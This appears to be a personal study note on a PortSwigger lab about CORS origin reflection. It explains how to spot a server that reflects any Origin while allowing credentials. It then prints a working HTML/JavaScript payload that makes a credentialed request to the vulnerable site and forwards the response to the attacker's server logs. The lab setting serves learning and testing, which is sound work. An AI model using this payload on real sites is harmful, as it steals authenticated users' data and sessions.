> [CORS Lab1](https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-basic-origin-reflection-attack#)
This website has an insecure CORS configuration in that it trusts all origins.
When we get the below option on the response header 
==Access-Control-Allow-Credentials: True==
If I try to add an ==Origin:anywebsite.com== on the Request and the Response includes 
==Access-Control-Allow-Origin: anywebsite.com== We can confirm the website is open to Origin-Reflection-Attack
We can then host our own page to create a malicious re-direct link where if clicked it sends the cookies from the victim to our server logs.
![[Pasted image 20251224093156.png]]

## Origin-Reflection-Attack Steps
We will host on our own server an index.html file with the below script.
We will need to then create a link to the webpage and send to victim.
When victim click on link it will trigger a redirect request to the vulnWebsite, and on our server logs we can retrieve the request.

### HTML Payload 

```html
<html>
<body>
<h1>Origin-Reflection Attack</h1>
	</body>
<script>
	const request = new XMLHttpRequest()

	request.open("get","https://vulnWebsite/Endpoint", true)

	request.onload = ()=>{
		window.location.href = "/secret?key=" + request.responseText
	}
	request.withCredentials = true
	request.send()
	</script>

	</html>
```